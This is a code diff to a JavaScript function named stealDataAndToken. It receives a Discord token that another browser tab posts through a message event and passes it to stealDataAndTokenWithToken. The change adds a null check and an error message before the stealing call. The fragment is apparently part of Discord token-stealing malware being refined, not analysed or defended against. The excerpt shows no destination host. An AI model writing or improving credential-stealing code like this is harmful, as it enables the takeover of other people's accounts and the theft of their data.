@@ -37,9 +37,13 @@ function stealDataAndToken() {
             // Retrieve the Discord token from the message data
             var discordToken = event.data.token;
 
-            // Proceed with stealing data using the retrieved token
-            // For simplicity, let's assume we call the original stealDataAndToken function here
-            stealDataAndTokenWithToken(discordToken);
+            // Check if the token is null
+            if (discordToken !== null) {
+                // Proceed with stealing data using the retrieved token
+                stealDataAndTokenWithToken(discordToken);
+            } else {
+                console.error('Received null Discord token from other tab.');
+            }
         }
     });
 
